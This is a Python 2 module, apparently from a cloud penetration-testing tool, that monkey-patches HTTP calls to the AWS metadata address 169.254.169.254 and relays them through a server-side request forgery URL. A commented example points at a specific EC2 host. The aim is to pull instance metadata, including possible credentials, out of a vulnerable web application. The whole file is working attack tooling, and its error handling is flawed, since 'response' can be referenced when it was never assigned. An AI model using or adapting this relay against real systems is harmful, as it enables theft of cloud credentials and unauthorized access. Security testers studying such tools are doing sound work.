import logging
import re
import sys

from functools import wraps

import requests
import httpretty

NOT_FOUND = '404 - Not Found'
# 'http://ec2-54-254-24-239.ap-southeast-1.compute.amazonaws.com/?url=%s'
VULN_URL = ''


def mangle(method, uri, headers):
    '''
    See help at common_arguments.add_mangle_arguments to understand what this is.
    '''
    mangled_url = VULN_URL % uri
    
    logging.debug('Requesting %s' % mangled_url)
    try:
        response = requests.get(mangled_url)
    except Exception, e:
        logging.exception('Unhandled exception in mangled request: %s' % e)
    
    code = 200
    if NOT_FOUND in response.text:
        code = 404
    
    #logging.debug('Status code: %s - Body: "%s..."' % (code, response.text[:10]))
        
    return (code, headers, response.text)
    
def setup_mangle(cmd_args):
    if cmd_args.mangle_function is not None:
        # We need to verify that the user configured function exists
        try:
            mangle_module_funct = cmd_args.mangle_function
            mangle_module = '.'.join(mangle_module_funct.split('.')[:-1])
            mangle_funct = mangle_module_funct.split('.')[-1]
            
            _temp = __import__(mangle_module, globals(), locals(), ['mangle_funct'], -1)
            mangle_funct = getattr(_temp, mangle_funct)
        except:
            msg = 'The user configured mangle function %s does not exist.'
            logging.critical(msg % mangle_funct)
            sys.exit(1)
        
        if VULN_URL is None:
            logging.critical('URL mangling to access remote instance meta-data'\
                             ' requires you to code your own mangle function'\
                             ' and configure it.')
            sys.exit(1)

        # enable HTTPretty so that it will monkey patch the socket module
        httpretty.enable()
    
        httpretty.register_uri(httpretty.GET,
                               re.compile("http://169.254.169.254/(.*)"),
                               body=mangle_funct)
    
def teardown_mangle():
    if httpretty.is_enabled():
        httpretty.disable()

def metadata_hook(fn):
    
    @wraps(fn)
    def wrapper(cmd_args, *args, **kwds):
        setup_mangle(cmd_args)
        try:
            fn(cmd_args, *args, **kwds)
        finally:
            teardown_mangle()
    
    return wrapper